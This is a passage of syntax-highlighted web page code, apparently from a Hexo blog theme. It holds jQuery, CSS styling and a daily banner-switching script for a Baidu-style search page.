string">'.Select-box-2 ul'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'height'</span><span class="token punctuation">,</span> <span class="token string">'48px'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//清空输入框内容 $('.qingkong').click(function () { cls(); $(this).css('display', 'none') }); function cls() { var sum = 0; var t = document.getElementsByTagName("INPUT"); for (var i = 0; i &lt; t.length; i++) { if (t[i].type == 'text') { ++sum; t[i].value = "";//清空 } } } //清空输入框按钮的显示和隐藏 function if_btn() { var btn_obj = document.getElementById("kw") || document.getElementById("kw-2"); var cls_btn = document.getElementById("qingkong"); var btn_obj_val; var times; //当元素获得焦点时 if (btn_obj == '' || btn_obj == null) { return false; //如果没有找到这个元素，则将函数返回，不继续执行 } btn_obj.onfocus = function () { times = setInterval(function () { btn_obj_val = btn_obj.value; if (btn_obj_val != 0) { cls_btn.style.display = "block"; } else { cls_btn.style.display = "none"; } }, 200); } //元素失去焦点时 btn_obj.onblur = function () { clearInterval(times); } } </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
    <span class="token selector">* </span><span class="token punctuation">{</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"微软雅黑"</span>
    <span class="token punctuation">}</span>
    <span class="token selector">ul,li,h1,h2,h3,h4,h5,h6,p,form,dl,dt,dd </span><span class="token punctuation">{</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector">img </span><span class="token punctuation">{</span>
        <span class="token property">border-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector">li </span><span class="token punctuation">{</span>
        <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left
    <span class="token punctuation">}</span>

    <span class="token selector">a </span><span class="token punctuation">{</span>
        <span class="token property">text-decoration</span><span class="token punctuation">:</span> none
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.card</span> </span><span class="token punctuation">{</span>
        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">25</span>, <span class="token number">240</span>, <span class="token number">229</span>, <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">96%</span><span class="token punctuation">;</span>
        <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">2%</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.baidu</span> </span><span class="token punctuation">{</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
        <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.baidu</span> form </span><span class="token punctuation">{</span>
        <span class="token property">position</span><span class="token punctuation">:</span> relative
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box</span> ul </span><span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> -<span class="token number">1</span>px<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>
        <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">9999</span><span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ccc</span><span class="token punctuation">;</span>
        <span class="token property">border-top</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box</span> li </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">60</span>px<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#484848</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box</span> li<span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#3385ff</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box</span> <span class="token class">.this_s</span> </span><span class="token punctuation">{</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#317ef3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box</span> <span class="token class">.this_s</span><span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#317ef3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.qingkong</span> </span><span class="token punctuation">{</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token number">120</span>px<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">12</span>px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">18</span>px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">18</span>px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">18</span>px<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">16</span>px<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#666666</span><span class="token punctuation">;</span>
        <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>
        <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.qingkong</span><span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.qingkong</span><span class="token pseudo-class">:active</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.baidu-2</span> </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">110</span>px<span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.baidu-2</span> form </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">520</span>px<span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.baidu-2</span> input </span><span class="token punctuation">{</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">13</span>px <span class="token number">8</span>px<span class="token punctuation">;</span>
        <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0.9</span><span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token id">#Select-2</span> </span><span class="token punctuation">{</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> </span><span class="token punctuation">{</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> ul </span><span class="token punctuation">{</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">46</span>px<span class="token punctuation">;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">1</span>px<span class="token punctuation">;</span>
        <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">9999</span><span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>, <span class="token number">255</span>, <span class="token number">255</span>, <span class="token number">0.9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ccc</span><span class="token punctuation">;</span>
        <span class="token property">border-top</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> li </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">60</span>px<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">46</span>px<span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#484848</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> li<span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#3385ff</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> <span class="token class">.this_s</span> </span><span class="token punctuation">{</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#317ef3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.Select-box-2</span> <span class="token class">.this_s</span><span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#317ef3</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token id">#kw-2</span> </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">335</span>px<span class="token punctuation">;</span>
        <span class="token property">outline</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ccc</span><span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">255</span>, <span class="token number">255</span>, <span class="token number">255</span>, <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#000000</span><span class="token punctuation">;</span>
        <span class="token property">padding-left</span><span class="token punctuation">:</span> <span class="token number">70</span>px<span class="token punctuation">;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/*修改搜索框样式*/</span>
    <span class="token selector"><span class="token id">#su-2</span> </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">90</span>px<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token hexcode">#3385ff</span> <span class="token number">1</span>px solid<span class="token punctuation">;</span>
        <span class="token property">border-bottom</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#2d78f4</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
        <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/*去轮廓阴影*/</span>
        <span class="token property">outline</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/*光标移动到搜索框颜色*/</span>
    <span class="token selector"><span class="token id">#su-2</span><span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
        <span class="token property">border-bottom</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid blue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token id">#su-2</span><span class="token pseudo-class">:active</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
        <span class="token property">box-shadow</span><span class="token punctuation">:</span> inset <span class="token number">1</span>px <span class="token number">1</span>px <span class="token number">3</span>px blue<span class="token punctuation">;</span>
        <span class="token property">-webkit-box-shadow</span><span class="token punctuation">:</span> inset <span class="token number">1</span>px <span class="token number">1</span>px <span class="token number">3</span>px blue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.jj-list-tit</span> </span><span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">16</span>px<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#ffffff</span><span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>
        <span class="token property">padding-left</span><span class="token punctuation">:</span> <span class="token number">38.5%</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.jj-list-con</span> </span><span class="token punctuation">{</span>
        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/*控制网站列表间距*/</span>
    <span class="token selector"><span class="token class">.jj-list-con</span> li </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">31.333%</span><span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">1%</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.link-3</span> </span><span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">.35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">13</span>px<span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">35</span>px<span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">4</span>px <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">2</span>px<span class="token punctuation">;</span>
        <span class="token property">transition</span><span class="token punctuation">:</span> all <span class="token number">0.2</span>s
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.link-3</span><span class="token pseudo-class">:hover</span> </span><span class="token punctuation">{</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">.45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/*1栏 小于584*/</span>
    <span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 584px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
        <span class="token selector"><span class="token class">.navi-height</span> </span><span class="token punctuation">{</span>
            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">1300</span>px<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector"><span class="token class">.link-box</span> </span><span class="token punctuation">{</span>
            <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">5%</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector"><span class="token class">.large-screen</span> </span><span class="token punctuation">{</span>
            <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* 2栏 大于584 小于993px */</span>
    <span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 584px<span class="token punctuation">)</span> and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 993px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
        <span class="token selector"><span class="token class">.navi-height</span> </span><span class="token punctuation">{</span>
            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">800</span>px<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector"><span class="token class">.link-box</span> </span><span class="token punctuation">{</span>
            <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">5%</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token selector"><span class="token class">.large-screen</span> </span><span class="token punctuation">{</span>
            <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/*3栏 大于993px*/</span>
    <span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 993px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
        <span class="token selector"><span class="token class">.navi-height</span> </span><span class="token punctuation">{</span>
            <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>
            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* 隐藏footer */</span>
    <span class="token selector"><span class="token class">.page-footer</span> </span><span class="token punctuation">{</span>
        <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.banner.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token comment" spellcheck="true">// 每天切换 banner 图.  Switch banner image every day.</span>
    <span class="token keyword">var</span> bannerUrl <span class="token operator">=</span> <span class="token string">"&lt;%- theme.jsDelivr.url %>&lt;%- url_for('/medias/banner/') %>"</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.webp'</span><span class="token punctuation">;</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url('</span> <span class="token operator">+</span> bannerUrl <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">else</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(&lt;%- theme.jsDelivr.url %>&lt;%- url_for('</span><span class="token operator">/</span>medias<span class="token operator">/</span>banner<span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">.</span>webp<span class="token string">') %>)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
